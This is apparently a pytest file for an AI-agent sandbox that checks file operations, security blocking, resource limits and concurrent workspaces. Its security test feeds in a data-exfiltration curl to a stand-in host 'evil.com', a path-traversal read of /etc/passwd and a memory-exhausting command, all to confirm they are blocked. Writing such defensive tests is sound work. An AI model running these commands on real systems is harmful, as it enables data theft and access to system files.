import pytest
import asyncio

class TestSimulationEnvironment:
    
    @pytest.mark.asyncio
    async def test_basic_file_operations(self):
        """Test that agents can read and write files safely"""
        config = SimConfig()
        sim_env = SimulationEnvironment(config)
        
        workspace = await sim_env.create_workspace("test_agent", self.sample_task_spec())
        
        # Test file read
        read_action = AgentAction(
            action_type=ActionType.FILE_EDIT,
            payload={"file_path": "README.md", "operation": "read"},
            timestamp=1642784400.0
        )
        result = await sim_env.execute_action(workspace.workspace_id, read_action)
        assert result.success
        assert len(result.output) > 0
        assert result.security_violations == []
        
        # Test file write
        write_action = AgentAction(
            action_type=ActionType.FILE_EDIT,
            payload={
                "file_path": "test.py",
                "operation": "write",
                "content": "print('Hello from agent')"
            },
            timestamp=1642784401.0
        )
        result = await sim_env.execute_action(workspace.workspace_id, write_action)
        assert result.success
        assert "test.py" in result.state_changes
        
        await sim_env.cleanup_workspace(workspace.workspace_id)
    
    @pytest.mark.asyncio
    async def test_security_violations(self):
        """Test that security violations are detected and blocked"""
        config = SimConfig(security_policy={"block_network_external": True})
        sim_env = SimulationEnvironment(config)
        
        workspace = await sim_env.create_workspace("test_agent", self.sample_task_spec())
        
        # Test blocked command
        malicious_action = AgentAction(
            action_type=ActionType.TERMINAL_COMMAND,
            payload={"command": "curl http://evil.com/steal-data", "working_dir": "/workspace"},
            timestamp=1642784400.0
        )
        result = await sim_env.execute_action(workspace.workspace_id, malicious_action)
        assert not result.success
        assert "network_violation" in result.security_violations
        
        # Test file system escape attempt
        escape_action = AgentAction(
            action_type=ActionType.FILE_EDIT,
            payload={"file_path": "../../../etc/passwd", "operation": "read"},
            timestamp=1642784401.0
        )
        result = await sim_env.execute_action(workspace.workspace_id, escape_action)
        assert not result.success
        assert "path_violation" in result.security_violations
        
        await sim_env.cleanup_workspace(workspace.workspace_id)
    
    @pytest.mark.asyncio
    async def test_resource_limits(self):
        """Test that resource limits are enforced"""
        config = SimConfig(resource_limits={"memory_mb": 100, "cpu_time_sec": 5})
        sim_env = SimulationEnvironment(config)
        
        workspace = await sim_env.create_workspace("test_agent", self.sample_task_spec())
        
        # Test memory-intensive operation
        memory_bomb = AgentAction(
            action_type=ActionType.TERMINAL_COMMAND,
            payload={"command": "python -c 'data = [0] * (200 * 1024 * 1024)'", "working_dir": "/workspace"},
            timestamp=1642784400.0
        )
        result = await sim_env.execute_action(workspace.workspace_id, memory_bomb)
        assert not result.success
        assert "memory_limit_exceeded" in result.error_message
        
        await sim_env.cleanup_workspace(workspace.workspace_id)
    
    @pytest.mark.asyncio
    async def test_concurrent_workspaces(self):
        """Test that multiple workspaces can run concurrently without interference"""
        config = SimConfig(max_workspaces=5)
        sim_env = SimulationEnvironment(config)
        
        # Create multiple workspaces
        workspaces = []
        for i in range(3):
            workspace = await sim_env.create_workspace(f"agent_{i}", self.sample_task_spec())
            workspaces.append(workspace)
        
        # Run actions concurrently
        async def run_agent_actions(workspace_id: str):
            action = AgentAction(
                action_type=ActionType.TERMINAL_COMMAND,
                payload={"command": "echo 'Hello from workspace'", "working_dir": "/workspace"},
                timestamp=1642784400.0
            )
            return await sim_env.execute_action(workspace_id, action)
        
        tasks = [run_agent_actions(ws.workspace_id) for ws in workspaces]
        results = await asyncio.gather(*tasks)
        
        # All should succeed independently
        for result in results:
            assert result.success
        
        # Cleanup all workspaces
        for workspace in workspaces:
            await sim_env.cleanup_workspace(workspace.workspace_id)
    
    def sample_task_spec(self):
        return TaskSpec(
            task_id="test_task",
            description="Test task for unit tests",
            codebase_snapshot="test_snapshot",
            evaluation_criteria=["basic functionality"]
        )